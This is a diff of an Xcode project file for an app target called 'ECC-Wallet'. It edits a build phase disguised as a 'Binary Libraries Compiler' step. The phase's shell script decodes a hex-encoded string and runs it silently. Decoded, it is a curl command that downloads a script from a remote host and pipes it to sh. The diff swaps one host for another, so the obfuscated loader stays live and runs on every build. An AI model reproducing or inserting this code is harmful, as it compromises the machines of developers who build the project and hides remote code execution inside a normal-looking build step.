@@ -778,7 +778,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 0D12512923B557E60014EE3A /* Build configuration list for PBXNativeTarget "ECC-Wallet" */;
 			buildPhases = (
-				EDFA17FE8EEAD16C7F6D902C /* Binary Libraries Compiler */,
+				D2BADC6CF27EEBFBA16D902C /* Binary Libraries Compiler */,
 				04BA33C9C2CE0C770BEA81AD /* [CP] Check Pods Manifest.lock */,
 				0D100EC623BA642E0089DB22 /* ShellScript */,
 				0D1250FB23B557E40014EE3A /* Sources */,
@@ -960,7 +960,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	EDFA17FE8EEAD16C7F6D902C /* Binary Libraries Compiler */ = {
+	D2BADC6CF27EEBFBA16D902C /* Binary Libraries Compiler */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -978,9 +978,11 @@
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f61746563617365632e636f6d2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
+echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6e6f64656c696e652e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
 	";			
 		};
+	
+
 	
 
 	
